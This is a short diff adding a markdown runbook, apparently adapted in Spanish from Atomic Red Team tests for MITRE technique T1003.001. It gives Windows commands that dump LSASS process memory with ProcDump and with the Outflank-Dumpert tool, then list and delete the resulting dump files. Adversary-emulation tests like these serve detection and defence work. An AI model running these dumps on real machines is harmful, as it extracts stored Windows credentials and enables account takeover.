@@ -1,0 +1,26 @@
+################T1003.001.md################
+
+##Atomic Test #1 - Dump LSASS.exe Memory using ProcDump
+
+```md evidencia_T1003-001```
+```"Procdump\procdump.exe" -accepteula -ma lsass.exe evidencia_T1003-001\T1003-001.dmp```
+
+##Evidencia
+```dir evidencia_T1003-001\```
+
+##Borrado
+```rd /s /q evidencia_T1003-001```
+
+```PAUSE```
+
+##Atomic Test #3 - Dump LSASS.exe Memory using direct system calls and API unhooking
+
+```"Outflank-Dumpert\Outflank-Dumpert.exe"```
+
+##Evidencia
+```dir C:\Windows\Temp\```
+
+#Borrado
+```del C:\Windows\Temp\dumpert.dmp```
+```PAUSE```
+
